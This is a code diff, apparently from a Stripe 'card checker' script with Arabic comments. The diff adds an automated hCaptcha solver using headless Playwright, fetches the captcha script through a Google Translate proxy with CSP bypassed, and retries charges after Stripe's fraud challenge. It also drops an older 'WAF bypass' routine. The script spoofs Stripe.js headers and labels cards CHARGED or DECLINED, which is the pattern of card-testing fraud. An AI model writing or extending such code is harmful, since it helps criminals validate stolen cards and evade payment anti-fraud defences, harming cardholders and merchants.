@@ -13,6 +13,7 @@ except ImportError:
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 SJUA = "stripe.js/da394b0aef; stripe-js-v3/da394b0aef; checkout"
 STRIPE_VER = "2020-08-27"
+HCK = "c7faac4c-1cd7-4b1b-b2d4-42ba98d09c7a"
 
 class C:
     R="\033[0m";B="\033[1m";RED="\033[91m";GRN="\033[92m";YEL="\033[93m"
@@ -91,6 +92,65 @@ def find_source_recursive(obj, depth=0, max_depth=12):
             if r: return r
     return None
 
+# --- دالة المتصفح لحل الكابتشا (تشتغل بس لو Stripe طلبها) ---
+async def _run_playwright_hcaptcha(checkout_url, rqdata=None, sitekey=None):
+    if not sitekey: return None
+    hc_file_path = "hc_script.js"
+    hc_script_text = ""
+    if os.path.exists(hc_file_path):
+        with open(hc_file_path, "r") as f: hc_script_text = f.read()
+    else:
+        session = AsyncSession(impersonate="chrome", timeout=15)
+        try:
+            r = await session.get("https://js-hcaptcha-com.translate.goog/1/api.js?render=explicit&_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en")
+            if r.status_code == 200:
+                hc_script_text = r.text
+                with open(hc_file_path, "w") as f: f.write(hc_script_text)
+        except: pass
+        finally: await session.close()
+
+    if not hc_script_text: return None
+
+    node_script = """
+    const { chromium } = require('playwright');
+    const fs = require('fs');
+    const url = process.argv[2], sitekey = process.argv[3], rqdata = process.argv[4], hc_file = process.argv[5];
+    const hc_script = fs.readFileSync(hc_file, 'utf8');
+    (async () => {
+        try {
+            const browser = await chromium.launch({ executablePath: '/usr/bin/chromium-browser', headless: true, args: ['--no-sandbox', '--disable-dev-shm-usage'] });
+            const context = await browser.newContext({ bypassCSP: true });
+            const page = await context.newPage();
+            await page.route('**/*hcaptcha*', async (route) => {
+                if (route.request().url().includes('api.js')) await route.fulfill({ status: 200, contentType: 'application/javascript', body: hc_script });
+                else await route.continue();
+            });
+            await page.goto(url, { waitUntil: 'domcontentloaded' });
+            try { await page.waitForFunction(() => typeof hcaptcha !== 'undefined', { timeout: 5000 }); } catch(e) { console.log("FAIL"); return; }
+            const token = await page.evaluate(async ({sitekey, rqdata}) => {
+                if (typeof hcaptcha === 'undefined') return 'undefined_hcaptcha';
+                return new Promise((resolve) => {
+                    const holder = document.createElement('div'); document.body.appendChild(holder);
+                    const wid = hcaptcha.render(holder, { sitekey, size: 'invisible', rqdata, callback: resolve, 'error-callback': (e) => resolve('error_' + e) });
+                    hcaptcha.execute(wid, {rqdata});
+                });
+            }, {sitekey, rqdata});
+            console.log(token);
+            await browser.close();
+        } catch (e) { console.log('FAIL'); }
+    })();
+    """
+    node_file_path = "solver.js"
+    with open(node_file_path, "w") as f: f.write(node_script)
+
+    try:
+        process = await asyncio.create_subprocess_exec("node", node_file_path, checkout_url, sitekey, (rqdata or ""), hc_file_path, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+        stdout, _ = await asyncio.wait_for(process.communicate(), timeout=25.0)
+        out = stdout.decode().strip()
+        if out and len(out) > 50 and not out.startswith("error_"): return out
+        return None
+    except Exception: return None
+
 class StripeSession:
     def __init__(self, url):
         self.url = url.strip()
@@ -122,7 +182,6 @@ class StripeSession:
         if not self.pk or not self.cs: return False, "missing cs/pk"
         
         if self.session: await self.session.close()
-        # تقليل وقت الانتظار لـ 15 ثانية عشان السرعة
         self.session = AsyncSession(impersonate="chrome", timeout=15)
         
         try:
@@ -166,21 +225,6 @@ class StripeSession:
                 e = j["error"]; return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
             return j.get("id"), None, None
         except Exception as e: return None, "net", str(e)[:80]
-
-    async def _handle_waf(self, conf, pi):
-        pi_id = pi.get("id")
-        cs_secret = pi.get("client_secret")
-        if pi_id and cs_secret:
-            endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
-            try:
-                r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge", data={"key": self.pk, "client_secret": cs_secret}, headers=self._hdrs(), timeout=15)
-                res = r.json()
-                vpi = res.get("payment_intent") or res.get("setup_intent") or res
-                st = vpi.get("status", "") if isinstance(vpi, dict) else ""
-                if st in ("succeeded", "requires_capture", "complete"):
-                    return {"success": True, "status": "CHARGED", "message": "Bypass hCaptcha OK", "raw": res}
-            except: pass
-        return {"success": False, "status": "REQUIRES_ACTION", "message": "WAF Bypass Failed"}
 
     async def _handle_3ds(self, conf, card):
         pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
@@ -261,6 +305,19 @@ class StripeSession:
             
             if "error" in j:
                 err = j["error"]
+                # لو Stripe طلب كابتشا حقيقية، هنا بنشغل المتصفح
+                if "intent_confirmation_challenge" in str(err).lower():
+                    log("WAF Detected! Calling Playwright...", C.GOLD)
+                    site_key = self.init_json.get("passive_captcha", {}).get("site_key", HCK)
+                    rqdata = err.get("next_action", {}).get("use_stripe_sdk", {}).get("stripe_js", {}).get("rqdata")
+                    token = await _run_playwright_hcaptcha(self.url, rqdata, site_key)
+                    if token:
+                        v_body = {"key": self.pk, "client_secret": err.get("payment_intent", {}).get("client_secret", ""), "captcha_response": token}
+                        v_r = await self.session.post(f"https://api.stripe.com/v1/payment_intents/{err.get('payment_intent', {}).get('id')}/verify_challenge", data=v_body, headers=self._hdrs())
+                        j = v_r.json()
+                        if "error" not in j:
+                            return await self.charge(card) # إعادة المحاولة بعد الكابتشا
+                
                 res["status"] = "DECLINED"
                 res["message"] = f"{err.get('code', '').upper()}: {err.get('message', '')}"
                 return res
@@ -278,8 +335,19 @@ class StripeSession:
                 is_waf = ("intent_confirmation_challenge" in sdk_type or "captcha" in sdk_type or bool(sjs.get("rqdata")))
                 
                 if is_waf:
-                    waf = await self._handle_waf(j, pi)
-                    res["status"] = waf.get("status", "REQUIRES_ACTION"); res["message"] = waf.get("message",""); res["success"] = waf.get("success", False)
+                    log("WAF Detected! Calling Playwright...", C.GOLD)
+                    site_key = self.init_json.get("passive_captcha", {}).get("site_key", HCK)
+                    rqdata = sjs.get("rqdata")
+                    token = await _run_playwright_hcaptcha(self.url, rqdata, site_key)
+                    if token:
+                        v_body = {"key": self.pk, "client_secret": pi.get("client_secret", ""), "captcha_response": token}
+                        endpoint = "setup_intents" if pi.get("id").startswith("seti_") else "payment_intents"
+                        v_r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi.get('id')}/verify_challenge", data=v_body, headers=self._hdrs())
+                        j = v_r.json()
+                        if "error" not in j:
+                            return await self.charge(card)
+                            
+                    res["status"] = "WAF_FAILED"; res["message"] = "Captcha Bypass Failed"
                 else:
                     three = await self._handle_3ds(j, card)
                     res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
